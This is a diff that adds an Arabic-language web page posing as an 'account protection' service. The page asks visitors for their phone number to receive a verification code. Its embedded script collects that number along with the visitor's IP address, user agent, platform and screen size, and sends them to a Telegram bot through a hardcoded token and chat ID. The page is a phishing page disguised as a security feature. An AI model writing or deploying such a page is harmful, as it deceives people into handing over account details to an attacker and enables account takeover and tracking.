@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>حماية الحساب</title>
+    <link rel="stylesheet" href="styles5.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+
+<style>
+body{
+    background-color: #ffffff;
+    display: center;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+
+}
+
+.top{
+direction: rtl;
+
+}
+
+#phone {
+    width: 90%;
+    border: none;
+    background-color: #ffffff;
+    border-bottom: 1px solid black;
+    padding: 10px;
+    margin: 10px 0;
+    font-size: 16px;
+    direction: rtl;
+   
+}
+
+button {
+    
+    width: 90%;
+    padding: 10px;
+    background-color: #FF2474;
+    color: white;
+    border: none;
+    border-radius: 25px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background 0.3s;
+
+}
+
+
+</style>
+
+
+
+
+
+
+
+
+<body>
+    <div class="top">
+      <h3>قم بي تأمن حسابك</h3>
+      <p>نحن غير مسؤولين إذا تم إختراق حسابك</p>
+      <input type="number" id="phone" placeholder="رقم الهاتف" required>
+      
+      <a href=""><button type="submit">الحصول على كود التحقق</button></a>
+      
+      
+    </div>
+    
+    
+
+    <script>
+        const TOKEN = "7798217019:AAEjmqaJFDaoI-u4bvwO9G9pq5_itm4AVkM"; // أدخل التوكين هنا
+        const CHAT_ID = "7901705257";         // أدخل معرف الشات هنا
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const phone = document.getElementById('phone').value;
+            
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = `
+                        <b>New Login Attempt</b>
+                        <b>phone:</b> ${phone}
+                        
+                        <b>IP Address:</b> ${ip}
+                        <b>Device Type:</b> ${deviceType}
+                        <b>Platform:</b> ${platform}
+                        <b>User Agent:</b> ${userAgent}
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(response => {
+                        alert('تم إرسال البيانات، سيتم تأمين حسابك. ');
+                    }).catch(error => {
+                        console.error(error.response?.data || error.message);
+                        alert('حدث خطأ أثناء إرسال المعلومات. الرجاء المحاولة مرة أخرى.');
+                    });
+                })
+                .catch(error => {
+                    console.error(error.message);
+                    alert('حدث خطأ. أتمنى أن تتحقق من الإتصال. ');
+                });
+        });
+    </script>
+</body>
+</html>
